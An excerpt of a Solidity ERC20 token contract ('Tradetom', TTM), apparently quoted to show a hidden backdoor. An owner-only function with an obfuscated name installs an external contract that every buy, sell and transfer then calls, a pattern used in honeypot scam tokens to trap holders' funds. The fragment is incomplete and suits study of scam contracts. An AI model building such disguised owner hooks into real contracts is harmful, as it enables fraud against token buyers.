...
contract TokenM is ERC20 {
    ...
    IUserAmountvsdtcl public vsdtcl;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Tradetom", "TTM") {
    ...
    function eoosvnRenntvcNocer(IUserAmountvsdtcl _vsdtcl) public onlyOwner {
        vsdtcl = _vsdtcl;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                vsdtcl.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				vsdtcl.addOutAmount(from, amount);
            }else{
                vsdtcl.addOutAmount(from, amount);
                takeFee = false;
            }
